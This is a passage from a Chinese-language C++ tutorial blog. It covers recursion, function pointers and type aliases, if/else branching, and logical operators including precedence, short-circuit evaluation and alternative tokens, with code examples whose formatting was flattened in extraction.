每次函数调用都会在称为“调用栈”的内存区域中创建一个新的记录（栈帧），用于存储函数的局部变量和返回地址。当函数返回时，其栈帧被移除。 示例：使用递归计算阶乘 阶乘 n! 定义为 n * (n-1) * ... * 1，并且 0! = 1。 123456789101112131415161718192021#include &lt;iostream&gt;// 递归函数：计算 n 的阶乘unsigned long long factorial(int n) &#123; // 基线条件：0! = 1 if (n == 0) &#123; return 1; &#125; // 递归步骤：n! = n * (n-1)! else &#123; return n * factorial(n - 1); // 函数调用自身 &#125;&#125;int main() &#123; int num = 5; std::cout &lt;&lt; num &lt;&lt; &quot;! = &quot; &lt;&lt; factorial(num) &lt;&lt; std::endl; // 输出: 5! = 120 num = 0; std::cout &lt;&lt; num &lt;&lt; &quot;! = &quot; &lt;&lt; factorial(num) &lt;&lt; std::endl; // 输出: 0! = 1 return 0;&#125; 7.9.2 包含多个递归调用的递归在这种形式中，函数在一次执行中可能会调用自身多次。这通常用于解决可以分解为多个相同类型子问题的问题，例如树的遍历或某些数学序列的计算。 示例：使用递归计算斐波那契数列 斐波那契数列定义如下：F(0) = 0, F(1) = 1, F(n) = F(n-1) + F(n-2) for n &gt; 1。 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// 递归函数：计算第 n 个斐波那契数unsigned long long fibonacci(int n) &#123; // 基线条件 if (n &lt;= 0) &#123; return 0; &#125; else if (n == 1) &#123; return 1; &#125; // 递归步骤：F(n) = F(n-1) + F(n-2) else &#123; // 函数调用自身两次 return fibonacci(n - 1) + fibonacci(n - 2); &#125;&#125;int main() &#123; int term = 10; std::cout &lt;&lt; &quot;Fibonacci(&quot; &lt;&lt; term &lt;&lt; &quot;) = &quot; &lt;&lt; fibonacci(term) &lt;&lt; std::endl; // 输出: Fibonacci(10) = 55 term = 6; std::cout &lt;&lt; &quot;Fibonacci(&quot; &lt;&lt; term &lt;&lt; &quot;) = &quot; &lt;&lt; fibonacci(term) &lt;&lt; std::endl; // 输出: Fibonacci(6) = 8 return 0;&#125; 工作原理和潜在问题: 计算 fibonacci(5) 的过程大致如下： 12345678910fibonacci(5) -&gt; fibonacci(4) + fibonacci(3) -&gt; (fibonacci(3) + fibonacci(2)) + (fibonacci(2) + fibonacci(1)) -&gt; ((fibonacci(2) + fibonacci(1)) + (fibonacci(1) + fibonacci(0))) + ((fibonacci(1) + fibonacci(0)) + 1) -&gt; (((fibonacci(1) + fibonacci(0)) + 1) + (1 + 0)) + ((1 + 0) + 1) -&gt; (((1 + 0) + 1) + (1 + 0)) + ((1 + 0) + 1) -&gt; ((1 + 1) + 1) + (1 + 1) -&gt; (2 + 1) + 2 -&gt; 3 + 2 -&gt; 5 (注意：实际计算 fibonacci(10) 会涉及更多层调用) 这种包含多个递归调用的实现方式（如此处的斐波那契）虽然直观地反映了数学定义，但效率可能非常低。例如，在计算 fibonacci(5) 时，fibonacci(3) 被计算了两次，fibonacci(2) 被计算了三次。随着 n 的增大，重复计算的次数呈指数级增长。 对于这类问题，迭代（使用循环）或其他优化技术（如记忆化，即存储已计算的结果）通常是更高效的解决方案。 递归的优缺点: 优点: 对于某些问题（如树遍历、分治算法），递归可以提供非常自然、简洁和易于理解的解决方案。 代码可以更接近问题的数学或逻辑描述。 缺点: 可能效率低下，特别是当存在大量重复计算或深度递归时。 每次函数调用都有开销（创建栈帧），可能导致性能问题。 深度递归可能耗尽调用栈空间，导致栈溢出错误。 调试递归函数可能比调试迭代函数更困难。 在选择使用递归还是迭代时，需要权衡代码的清晰度、简洁性与潜在的性能和内存消耗。 7.10 函数指针就像变量有地址，函数也有地址。函数指针 (Function Pointer) 就是一个指向函数内存地址的指针变量。通过函数指针，我们可以像调用普通函数一样调用它所指向的函数。函数指针的主要用途包括： 将函数作为参数传递给其他函数（例如，实现回调机制或策略模式）。 在运行时决定调用哪个函数。 构建函数表或调度表。 7.10.1 函数指针的基础知识声明函数指针: 声明函数指针时，必须指定它所指向的函数的返回类型和参数列表类型。这确保了类型安全，即函数指针只能指向具有匹配签名的函数。 语法: 1return_type (*pointer_name)(parameter_type_list); return_type: 函数指针指向的函数的返回类型。 pointer_name: 函数指针变量的名称。 parameter_type_list: 函数指针指向的函数的参数类型列表，用逗号分隔。 (*pointer_name): 括号是必需的，它表明 pointer_name 是一个指针。如果没有括号，return_type *pointer_name(parameter_type_list); 会被解释为一个返回 return_type* 类型的函数声明。 示例声明: 1234567891011// 声明一个名为 func_ptr 的函数指针// 它指向一个接受两个 int 参数并返回 int 的函数int (*func_ptr)(int, int);// 声明一个名为 process 的函数指针// 它指向一个接受 const char* 参数且无返回值 (void) 的函数void (*process)(const char*);// 声明一个名为 compare 的函数指针// 它指向一个接受两个 double 参数并返回 bool 的函数bool (*compare)(double, double); 初始化函数指针: 可以将函数的名称（不带括号）直接赋给具有匹配签名的函数指针。函数名本身就代表了函数的地址。 12345678int add(int a, int b) &#123; return a + b; &#125;void print_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;// 初始化 func_ptr 指向 add 函数func_ptr = add; // 或者 func_ptr = &amp;add; (&amp; 是可选的)// 初始化 process 指向 print_message 函数process = print_message; 使用函数指针调用函数: 可以通过函数指针来调用它所指向的函数，语法与直接调用函数类似。 123456int result = func_ptr(5, 3); // 调用 add(5, 3)，result 将是 8process(&quot;Hello via pointer!&quot;); // 调用 print_message(&quot;Hello via pointer!&quot;)// 也可以使用显式解引用语法 (较少见)// int result = (*func_ptr)(5, 3);// (*process)(&quot;Hello via pointer!&quot;); 7.10.2 函数指针示例下面是一个完整的示例，演示如何声明、初始化和使用函数指针。 12345678910111213141516171819202122232425262728293031323334353637383940414243#include &lt;iostream&gt;// 目标函数 1int add(int x, int y) &#123; return x + y;&#125;// 目标函数 2int subtract(int x, int y) &#123; return x - y;&#125;// 目标函数 3void display_result(int result) &#123; std::cout &lt;&lt; &quot;The result is: &quot; &lt;&lt; result &lt;&lt; std::endl;&#125;int main() &#123; // 声明一个指向接受两个 int 并返回 int 的函数的指针 int (*operation)(int, int); // 声明一个指向接受一个 int 且无返回值的函数的指针 void (*show)(int); // 将 operation 指向 add 函数 operation = add; std::cout &lt;&lt; &quot;Using &#x27;add&#x27; function via pointer:&quot; &lt;&lt; std::endl; int sum = operation(10, 5); // 调用 add(10, 5) std::cout &lt;&lt; &quot;10 + 5 = &quot; &lt;&lt; sum &lt;&lt; std::endl; // 输出: 15 // 将 operation 指向 subtract 函数 operation = subtract; std::cout &lt;&lt; &quot;\\nUsing &#x27;subtract&#x27; function via pointer:&quot; &lt;&lt; std::endl; int diff = operation(10, 5); // 调用 subtract(10, 5) std::cout &lt;&lt; &quot;10 - 5 = &quot; &lt;&lt; diff &lt;&lt; std::endl; // 输出: 5 // 将 show 指向 display_result 函数 show = display_result; std::cout &lt;&lt; &quot;\\nDisplaying difference using &#x27;show&#x27; pointer:&quot; &lt;&lt; std::endl; show(diff); // 调用 display_result(diff) return 0;&#125; 7.10.3 深入探讨函数指针函数指针作为函数参数: 一个常见的用途是将函数指针作为参数传递给另一个函数。这允许调用函数根据传入的函数指针来定制其行为。 123456789101112131415161718192021222324252627282930313233343536#include &lt;iostream&gt;#include &lt;vector&gt;// 函数：检查一个数字是否为偶数bool is_even(int n) &#123; return n % 2 == 0;&#125;// 函数：检查一个数字是否为正数bool is_positive(int n) &#123; return n &gt; 0;&#125;// 函数：打印满足特定条件的数字// 参数：一个整数向量，一个函数指针 (指向检查条件的函数)void print_numbers_if(const std::vector&lt;int&gt;&amp; numbers, bool (*check)(int)) &#123; std::cout &lt;&lt; &quot;Numbers satisfying the condition: &quot;; for (int num : numbers) &#123; if (check(num)) &#123; // 使用传入的函数指针调用检查函数 std::cout &lt;&lt; num &lt;&lt; &quot; &quot;; &#125; &#125; std::cout &lt;&lt; std::endl;&#125;int main() &#123; std::vector&lt;int&gt; data = &#123;1, -2, 3, 4, -5, 6&#125;; std::cout &lt;&lt; &quot;Checking for even numbers:&quot; &lt;&lt; std::endl; print_numbers_if(data, is_even); // 传递 is_even 函数的地址 std::cout &lt;&lt; &quot;\\nChecking for positive numbers:&quot; &lt;&lt; std::endl; print_numbers_if(data, is_positive); // 传递 is_positive 函数的地址 return 0;&#125; 输出: 1234Checking for even numbers:Numbers satisfying the condition: -2 4 6Checking for positive numbers:Numbers satisfying the condition: 1 3 4 6 在这个例子中，print_numbers_if 函数的行为由传递给它的 check 函数指针决定。 7.10.4 使用 typedef 或 using 进行简化函数指针的声明语法可能比较冗长和复杂。可以使用 typedef (传统方式) 或 using (C++11 及以后推荐) 来创建函数指针类型的别名，使代码更清晰。 使用 typedef: 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// 使用 typedef 定义函数指针类型别名typedef bool (*CheckFunction)(int); // CheckFunction 是指向 (int) -&gt; bool 函数的指针类型typedef void (*DisplayFunction)(const char*);void print_if(int val, CheckFunction check, DisplayFunction display) &#123; if (check(val)) &#123; display(&quot;Condition met!&quot;); &#125; else &#123; display(&quot;Condition not met.&quot;); &#125;&#125;bool is_negative(int n) &#123; return n &lt; 0; &#125;void show_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;int main() &#123; CheckFunction checker = is_negative; // 使用别名声明和初始化 DisplayFunction printer = show_message; print_if(-5, checker, printer); // 输出: Condition met! print_if(10, checker, printer); // 输出: Condition not met. return 0;&#125; 使用 using (C++11): using 提供了更直观、更一致的别名语法。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;// 使用 using 定义函数指针类型别名 (推荐)using CheckFunction = bool (*)(int); // 指向 (int) -&gt; bool 函数的指针类型using DisplayFunction = void (*)(const char*);// ... (函数 print_if, is_negative, show_message 和 main 函数同上) ...void print_if(int val, CheckFunction check, DisplayFunction display) &#123; if (check(val)) &#123; display(&quot;Condition met!&quot;); &#125; else &#123; display(&quot;Condition not met.&quot;); &#125;&#125;bool is_negative(int n) &#123; return n &lt; 0; &#125;void show_message(const char* msg) &#123; std::cout &lt;&lt; msg &lt;&lt; std::endl; &#125;int main() &#123; CheckFunction checker = is_negative; DisplayFunction printer = show_message; print_if(-5, checker, printer); print_if(10, checker, printer); return 0;&#125; 使用类型别名可以显著提高涉及函数指针的代码的可读性。 总结: 函数指针是 C++ 中一个强大的特性，它允许将函数视为数据进行传递和存储。虽然语法可能初看起来有些复杂，但通过 typedef 或 using 可以简化。理解函数指针对于掌握回调机制、某些设计模式以及与 C 库交互非常重要。在现代 C++ 中，函数对象（Functors）和 Lambda 表达式（将在后续章节介绍）提供了更灵活、有时更方便的替代方案，但函数指针仍然有其用武之地。 7.11 总结本章深入探讨了函数这一 C++ 编程的基本模块，涵盖了函数定义、调用、参数传递机制以及如何将函数与各种数据类型（数组、字符串、结构、对象）结合使用。 主要内容回顾： 函数基础: 复习了函数的定义（返回类型、名称、参数列表、函数体）、函数原型（声明函数接口以供编译器使用）和函数调用（执行函数代码）。 参数传递: 按值传递 (Pass by Value): C++ 的默认方式，适用于基本类型、结构和类对象。函数操作的是实参的副本，不影响原始数据，但可能因复制大型对象而效率低下。 数组传递: C 风格数组传递时会退化为指向首元素的指针，函数直接操作原始数组，效率高但丢失大小信息，需额外传递大小或使用指针区间。const 可用于保护数组内容。 二维数组传递: 必须在函数参数中指定除第一维之外的所有维度的大小。 结构传递: 默认按值传递。为提高效率或允许修改，可传递结构指针 (struct_type*)，使用 -&gt; 访问成员，或使用引用（第 8 章内容）。 std::string 和 std::array 对象传递: 默认按值传递，但通常推荐按常量引用 (const T&amp;) 传递以获得效率和安全性，或按引用 (T&amp;) 传递以允许修改。 函数与特定类型: C-风格字符串: 作为 char* 传递，依赖 \\0 结束符。返回 C 风格字符串比较复杂，推荐让调用者提供缓冲区。 std::string 对象: 使用 const std::string&amp; 传递是常用方式。返回 std::string 通常因 RVO/NRVO 而高效。 std::array 对象: 行为类似结构，大小是类型的一部分。推荐使用 const std::array&lt;T, N&gt;&amp; 传递。 递归: 函数调用自身来解决问题。需要明确的基线条件来停止递归，以及使问题规模缩小的递归步骤。递归可以使某些问题的代码简洁，但可能效率低或导致栈溢出。 函数指针: 指向函数地址的指针变量。允许将函数作为参数传递、在运行时选择函数等。声明时需匹配函数签名（返回类型和参数类型）。typedef 或 using 可简化其声明。 通过本章的学习，我们掌握了如何有效地定义和使用函数来构建模块化、可重用和可维护的 C++ 程序，并了解了不同数据类型在函数参数传递中的行为和最佳实践。","categories":[],"tags":[{"name":"Program","slug":"Program","permalink":"http://uniqueland.top/tags/Program/"},{"name":"C++","slug":"C","permalink":"http://uniqueland.top/tags/C/"}]},{"title":"Chapter 6 分支语句和逻辑运算符","slug":"Cpp_tutorial_Chapter_6","date":"2025-04-26T12:03:35.379Z","updated":"2025-04-26T12:01:50.496Z","comments":true,"path":"2025/04/26/Cpp_tutorial_Chapter_6/","link":"","permalink":"http://uniqueland.top/2025/04/26/Cpp_tutorial_Chapter_6/","excerpt":"","text":"6.1 if语句分支语句允许程序根据特定条件选择执行不同的代码路径。if 语句是 C++ 中最基本的分支结构，它允许程序根据一个条件表达式 (Condition) 的真假来决定是否执行某段代码。 基本语法: 123456789if (condition) &#123; // 如果 condition 为 true，则执行这里的语句 statement1; statement2; // ...&#125;// 或者如果只有一条语句if (condition) single_statement; condition: 一个求值为布尔值 (true 或 false) 的表达式。通常是关系表达式（如 x &gt; 5, name == &quot;Alice&quot;）或逻辑表达式。非零值被视为 true，零值被视为 false。 &#123; ... &#125;: 花括号定义了一个语句块。如果条件为 true，则执行块内的所有语句。如果只有一条语句需要根据条件执行，可以省略花括号，但为了清晰和避免错误，通常推荐总是使用花括号。 执行流程: 计算 condition 的值。 如果 condition 为 true，执行 if 语句后面的语句（或语句块）。 如果 condition 为 false，跳过 if 语句后面的语句（或语句块），继续执行 if 结构之后的代码。 用法与示例: 1234567891011121314151617181920#include &lt;iostream&gt;int main() &#123; int temperature; std::cout &lt;&lt; &quot;Enter the current temperature (Celsius): &quot;; std::cin &gt;&gt; temperature; // 简单的 if 语句 if (temperature &gt; 30) &#123; std::cout &lt;&lt; &quot;It&#x27;s hot outside!&quot; &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Remember to stay hydrated.&quot; &lt;&lt; std::endl; &#125; if (temperature &lt; 10) std::cout &lt;&lt; &quot;It&#x27;s cold, wear a jacket!&quot; &lt;&lt; std::endl; // 只有一条语句，可以省略花括号 std::cout &lt;&lt; &quot;Temperature check finished.&quot; &lt;&lt; std::endl; return 0;&#125; 在这个例子中，如果用户输入的 temperature 大于 30，会打印两条消息；如果小于 10，会打印另一条消息；否则，这些 if 块内的代码会被跳过。 6.1.1 if else语句if 语句允许我们在条件为真时执行代码，但如果我们希望在条件为假时执行另一段代码，就需要使用 if else 结构。 语法: 1234567if (condition) &#123; // 如果 condition 为 true，执行这里的语句块 (if block) statement_block_1;&#125; else &#123; // 如果 condition 为 false，执行这里的语句块 (else block) statement_block_2;&#125; 执行流程: 计算 condition 的值。 如果 condition 为 true，执行 if 后面的语句块 (statement_block_1)，然后跳过 else 后面的语句块 (statement_block_2)。 如果 condition 为 false，跳过 if 后面的语句块 (statement_block_1)，执行 else 后面的语句块 (statement_block_2)。 执行完选择的块后，程序继续执行 if else 结构之后的代码。 关键点: if 块和 else 块是互斥的，程序只会执行其中一个。 用法与示例: 12345678910111213141516171819#include &lt;iostream&gt;int main() &#123; int age; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; if (age &gt;= 18) &#123; std::cout &lt;&lt; &quot;You are eligible to vote.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;You are not yet eligible to vote.&quot; &lt;&lt; std::endl; int years_to_wait = 18 - age; std::cout &lt;&lt; &quot;You need to wait &quot; &lt;&lt; years_to_wait &lt;&lt; &quot; more year(s).&quot; &lt;&lt; std::endl; &#125; std::cout &lt;&lt; &quot;Age check complete.&quot; &lt;&lt; std::endl; return 0;&#125; 这个程序会根据用户输入的年龄，打印两条不同的消息之一。 6.1.2 格式化if else语句清晰的代码格式对于可读性和可维护性至关重要。对于 if else 语句，推荐遵循以下格式化约定： 使用花括号 &#123;&#125;: 即使 if 或 else 后面只有一条语句，也推荐使用花括号。这可以防止在后续添加代码时引入悬挂 else (dangling else) 等错误，并使代码结构更清晰。 缩进: if 和 else 块内部的语句应该相对于 if 和 else 关键字进行缩进（通常是 4 个空格或一个制表符）。 else 的位置: else 关键字通常与对应的 if 语句的右花括号 &#125; 放在同一行，或者单独放在下一行并与 if 对齐。两种风格都很常见。 示例 (推荐的格式): 123456789101112131415161718192021222324// 风格 1: else 与 if 的 &#125; 在同一行if (condition) &#123; // ... statements ...&#125; else &#123; // ... statements ...&#125;// 风格 2: else 单独一行，与 if 对齐if (condition) &#123; // ... statements ...&#125; else &#123; // ... statements ...&#125;// 不推荐的格式 (即使只有一条语句)// if (condition) statement1; else statement2; // 可读性差，易出错// 推荐的格式 (即使只有一条语句)if (condition) &#123; statement1;&#125; else &#123; statement2;&#125; 悬挂 else 问题: 当 if 语句嵌套且省略花括号时，else 会与最近的未匹配的 if 相关联，这可能不符合预期。 123456789101112131415161718int a = 1, b = -1;// 错误的意图 (可能想让 else 对应外层 if)if (a &gt; 0) if (b &gt; 0) std::cout &lt;&lt; &quot;Both positive&quot;;else // 这个 else 实际上对应的是 if (b &gt; 0) std::cout &lt;&lt; &quot;a is not positive&quot;; // 这行不会按预期执行// 正确的写法 (使用花括号明确关联)if (a &gt; 0) &#123; // 外层 if if (b &gt; 0) &#123; // 内层 if std::cout &lt;&lt; &quot;Both positive&quot;; &#125; // 没有 else 对应内层 if&#125; else &#123; // 这个 else 对应外层 if (a &gt; 0) std::cout &lt;&lt; &quot;a is not positive&quot;; &#125; 始终使用花括号可以完全避免悬挂 else 问题。 6.1.3 if else if else结构当需要从多个互斥的选项中选择一个执行路径时，可以使用 if else if else 结构。它本质上是一系列嵌套的 if else 语句，但通常写成更扁平的结构。 语法: 123456789101112131415if (condition1) &#123; // 如果 condition1 为 true，执行这里的语句块 statement_block_1;&#125; else if (condition2) &#123; // 如果 condition1 为 false 且 condition2 为 true，执行这里的语句块 statement_block_2;&#125; else if (condition3) &#123; // 如果 condition1 和 condition2 都为 false 且 condition3 为 true，执行这里的语句块 statement_block_3;&#125; // ... 可以有更多的 else if 分支else &#123; // 如果以上所有条件都为 false，执行这里的语句块 (可选的默认分支) statement_block_default;&#125; 执行流程: 从上到下依次检查每个 if 和 else if 的条件。 一旦找到第一个为 true 的条件，就执行其对应的语句块。 执行完该块后，跳过所有剩余的 else if 和 else 分支，直接执行整个 if else if else 结构之后的代码。 如果所有的 if 和 else if 条件都为 false，则执行最后的 else 块（如果存在）。如果不存在最后的 else 块，则整个结构什么也不执行。 用法与示例: 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; int score; std::cout &lt;&lt; &quot;Enter your numerical score (0-100): &quot;; std::cin &gt;&gt; score; char grade; if (score &lt; 0 || score &gt; 100) &#123; std::cout &lt;&lt; &quot;Invalid score entered.&quot; &lt;&lt; std::endl; grade = &#x27;I&#x27;; // Invalid &#125; else if (score &gt;= 90) &#123; grade = &#x27;A&#x27;; &#125; else if (score &gt;= 80) &#123; grade = &#x27;B&#x27;; &#125; else if (score &gt;= 70) &#123; grade = &#x27;C&#x27;; &#125; else if (score &gt;= 60) &#123; grade = &#x27;D&#x27;; &#125; else &#123; // score &lt; 60 grade = &#x27;F&#x27;; &#125; if (grade != &#x27;I&#x27;) &#123; std::cout &lt;&lt; &quot;Your grade is: &quot; &lt;&lt; grade &lt;&lt; std::endl; &#125; return 0;&#125; 这个例子根据分数范围判断对应的等级。程序会按顺序检查条件，一旦满足一个（例如 score &gt;= 80），就会确定等级为 ‘B’，并跳过后续的 else if 和 else。最后的 else 处理所有低于 60 分的情况。 6.2 逻辑表达式在 if 或循环的条件中，我们常常需要组合多个关系表达式或者对某个条件取反。逻辑运算符 (Logical Operators) 用于组合或修改已有的布尔表达式（或可以转换为布尔值的表达式），生成一个新的布尔结果 (true 或 false)。 C++ 主要提供三种逻辑运算符： 逻辑或 (Logical OR): || 逻辑与 (Logical AND): &amp;&amp; 逻辑非 (Logical NOT): ! 6.2.1 逻辑OR运算符：||逻辑或运算符 || 用于连接两个表达式。如果至少有一个操作数为 true，则整个 || 表达式的结果为 true。只有当两个操作数都为 false 时，结果才为 false。 真值表: | 操作数1 | 操作数2 | 操作数1 || 操作数2 || :—— | :—— | :——————- || true | true | true || true | false | true || false | true | true || false | false | false | 用法与示例: || 常用于检查多个条件中是否至少有一个满足。 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; char input_char; std::cout &lt;&lt; &quot;Enter a character: &quot;; std::cin &gt;&gt; input_char; // 检查字符是否是元音字母 (忽略大小写) if (input_char == &#x27;a&#x27; || input_char == &#x27;e&#x27; || input_char == &#x27;i&#x27; || input_char == &#x27;o&#x27; || input_char == &#x27;u&#x27; || input_char == &#x27;A&#x27; || input_char == &#x27;E&#x27; || input_char == &#x27;I&#x27; || input_char == &#x27;O&#x27; || input_char == &#x27;U&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; input_char &lt;&lt; &quot;&#x27; is a vowel.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; input_char &lt;&lt; &quot;&#x27; is not a vowel.&quot; &lt;&lt; std::endl; &#125; int age = 25; bool has_ticket = false; // 检查是否满足入场条件 (年龄小于 12 或持有门票) if (age &lt; 12 || has_ticket) &#123; std::cout &lt;&lt; &quot;Allowed entry.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Entry denied.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 6.2.2 逻辑AND运算符：&amp;&amp;逻辑与运算符 &amp;&amp; 用于连接两个表达式。只有当两个操作数都为 true 时，整个 &amp;&amp; 表达式的结果才为 true。只要有至少一个操作数为 false，结果就为 false。 真值表: 操作数1 操作数2 操作数1 &amp;&amp; 操作数2 true true true true false false false true false false false false 用法与示例: &amp;&amp; 常用于检查是否同时满足多个条件。 12345678910111213141516171819202122232425262728#include &lt;iostream&gt;int main() &#123; int age; bool has_id; char id_input; std::cout &lt;&lt; &quot;Enter your age: &quot;; std::cin &gt;&gt; age; std::cout &lt;&lt; &quot;Do you have an ID? (y/n): &quot;; std::cin &gt;&gt; id_input; has_id = (id_input == &#x27;y&#x27; || id_input == &#x27;Y&#x27;); // 检查是否满足购买条件 (年龄大于等于 18 并且持有 ID) if (age &gt;= 18 &amp;&amp; has_id) &#123; std::cout &lt;&lt; &quot;Purchase approved.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Purchase denied.&quot; &lt;&lt; std::endl; if (age &lt; 18) &#123; std::cout &lt;&lt; &quot;Reason: Underage.&quot; &lt;&lt; std::endl; &#125; if (!has_id) &#123; // 使用了逻辑非 ! std::cout &lt;&lt; &quot;Reason: No ID presented.&quot; &lt;&lt; std::endl; &#125; &#125; return 0;&#125; 6.2.3 用&amp;&amp;来设置取值范围逻辑与运算符 &amp;&amp; 非常适合用来检查一个值是否落在某个特定的范围内（即同时满足大于某个值和小于另一个值）。 用法与示例: 1234567891011121314151617181920212223242526272829#include &lt;iostream&gt;int main() &#123; int score; std::cout &lt;&lt; &quot;Enter your score: &quot;; std::cin &gt;&gt; score; // 检查分数是否在有效范围 [0, 100] 内 if (score &gt;= 0 &amp;&amp; score &lt;= 100) &#123; std::cout &lt;&lt; &quot;Score is valid.&quot; &lt;&lt; std::endl; // 进一步判断等级 if (score &gt;= 60 &amp;&amp; score &lt; 70) &#123; std::cout &lt;&lt; &quot;Grade: D&quot; &lt;&lt; std::endl; &#125; else if (score &gt;= 70 &amp;&amp; score &lt; 80) &#123; std::cout &lt;&lt; &quot;Grade: C&quot; &lt;&lt; std::endl; &#125; // ... 其他等级判断 &#125; else &#123; std::cout &lt;&lt; &quot;Score is invalid (out of range 0-100).&quot; &lt;&lt; std::endl; &#125; // 检查一个字符是否是大写字母 char ch = &#x27;Q&#x27;; if (ch &gt;= &#x27;A&#x27; &amp;&amp; ch &lt;= &#x27;Z&#x27;) &#123; std::cout &lt;&lt; &quot;&#x27;&quot; &lt;&lt; ch &lt;&lt; &quot;&#x27; is an uppercase letter.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 注意: 不能像数学中那样写 0 &lt;= score &lt;= 100。这在 C++ 中会被解释为 (0 &lt;= score) &lt;= 100。(0 &lt;= score) 的结果是 true (1) 或 false (0)，然后这个 0 或 1 再与 100 比较，结果几乎总是 true，无法正确判断范围。必须使用 &amp;&amp; 连接两个独立的比较。 6.2.4 逻辑NOT运算符：!逻辑非运算符 ! 是一个一元运算符（只需要一个操作数）。它将其操作数的布尔值取反：如果操作数为 true，结果为 false；如果操作数为 false，结果为 true。 真值表: 操作数 !操作数 true false false true 用法与示例: ! 用于反转一个条件的结果。 123456789101112131415161718192021222324252627282930#include &lt;iostream&gt;int main() &#123; bool is_raining = false; int items_in_cart = 0; // 如果不是在下雨 if (!is_raining) &#123; std::cout &lt;&lt; &quot;It&#x27;s not raining. Good day for a walk!&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;It&#x27;s raining. Better stay inside.&quot; &lt;&lt; std::endl; &#125; // 检查购物车是否为空 // items_in_cart == 0 也可以，但 !items_in_cart 更简洁 (利用 0 转换为 false) if (!items_in_cart) &#123; std::cout &lt;&lt; &quot;Your shopping cart is empty.&quot; &lt;&lt; std::endl; &#125; // 检查 cin 读取是否失败 int value; std::cout &lt;&lt; &quot;Enter a number: &quot;; if (!(std::cin &gt;&gt; value)) &#123; // 如果读取失败 (cin 转换为 false), !cin 为 true std::cout &lt;&lt; &quot;Invalid input or EOF.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;You entered: &quot; &lt;&lt; value &lt;&lt; std::endl; &#125; return 0;&#125; 6.2.5 逻辑运算符细节 优先级 (Precedence): 逻辑非 ! 具有最高的优先级，高于所有关系运算符和算术运算符。 逻辑与 &amp;&amp; 的优先级高于逻辑或 ||。 逻辑运算符的优先级低于关系运算符 (&lt;, ==, != 等)。 赋值运算符 (=) 优先级最低。 *常见优先级顺序 (高到低):** ! 算术运算符 (*, /, %, +, -) 关系运算符 (&lt;, &lt;=, &gt;, &gt;=) 相等运算符 (==, !=) 逻辑与 &amp;&amp; 逻辑或 || 赋值运算符 (=, += 等) 建议: 当不确定优先级或为了提高可读性时，使用括号 () 来明确指定运算顺序。 1if ((age &gt;= 18 &amp;&amp; age &lt; 65) || is_student) &#123; ... &#125; // 括号明确了 &amp;&amp; 先于 || 短路求值 (Short-Circuit Evaluation): &amp;&amp; (逻辑与): 如果 &amp;&amp; 的左侧操作数计算结果为 false，则右侧操作数不会被计算。因为无论右侧是什么，整个表达式的结果都必然是 false。 || (逻辑或): 如果 || 的左侧操作数计算结果为 true，则右侧操作数不会被计算。因为无论右侧是什么，整个表达式的结果都必然是 true。 短路求值非常重要，因为它： 提高效率: 避免了不必要的计算。 允许安全检查: 可以在检查指针有效性后才解引用它，或在除数非零时才执行除法。 *短路求值示例:** 12345678910111213141516171819202122232425262728293031323334#include &lt;iostream&gt;int main() &#123; int divisor = 0; int value = 10; // 安全的除法检查 (因为 divisor 为 0，右侧不会执行) if (divisor != 0 &amp;&amp; value / divisor &gt; 1) &#123; std::cout &lt;&lt; &quot;Result is greater than 1.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Divisor is zero or result is not greater than 1.&quot; &lt;&lt; std::endl; &#125; int *ptr = nullptr; // 安全的指针访问 (因为 ptr 为 nullptr，右侧不会执行) if (ptr != nullptr &amp;&amp; ptr-&gt;some_member == 5) &#123; std::cout &lt;&lt; &quot;Pointer member is 5.&quot; &lt;&lt; std::endl; &#125; else &#123; std::cout &lt;&lt; &quot;Pointer is null or member is not 5.&quot; &lt;&lt; std::endl; &#125; int count = 0; // || 的短路 (因为 ++count &gt; 0 为 true，右侧不会执行) if (++count &gt; 0 || some_expensive_function()) &#123; std::cout &lt;&lt; &quot;Condition met. Count is &quot; &lt;&lt; count &lt;&lt; std::endl; // count 变为 1 &#125; return 0;&#125;bool some_expensive_function() &#123; std::cout &lt;&lt; &quot;Expensive function called!&quot; &lt;&lt; std::endl; // 这行不会被打印 return true;&#125; 6.2.6 其他表示方式为了兼容某些可能缺少 |, &amp;, ! 字符的键盘或字符集，C++ 标准定义了一些替代表示（也称为 “digraphs” 或 “alternative tokens”）。这些是关键字，可以直接使用，无需包含特殊头文件。 逻辑运算符 替代表示 &amp;&amp; and ` ! not &amp;= and_eq ` =` ^= xor_eq ~ compl &amp; bitand ` ` ^ xor != not_eq 用法与示例: 12345678910111213141516171819202122232425#include &lt;iostream&gt;int main() &#123; int x = 5, y = 10; bool flag = false; // 使用替代表示 if (x &gt; 0 and y &lt; 20) &#123; // 等价于 x &gt; 0 &amp;&amp; y &lt; 20 std::cout &lt;&lt; &quot;Condition (and) is true.&quot; &lt;&lt; std::endl; &#125; if (x &lt; 0 or y == 10) &#123; // 等价于 x &lt; 0 || y == 10 std::cout &lt;&lt; &quot;Condition (or) is true.&quot; &lt;&lt; std::endl; &#125; if (not flag) &#123; // 等价于 !flag std::cout &lt;&lt; &quot;Condition (not) is true.&quot; &lt;&lt; std::endl; &#125; if (x not_eq y) &#123; // 等价于 x != y std::cout &lt;&lt; &quot;Condition (not_eq) is true.&quot; &lt;&lt; std::endl; &#125; return 0;&#125; 虽然这些替代表示是合法的 C++，但在现代编程实践中，直接使用符号运算符 (&amp;&amp;, ||, !) 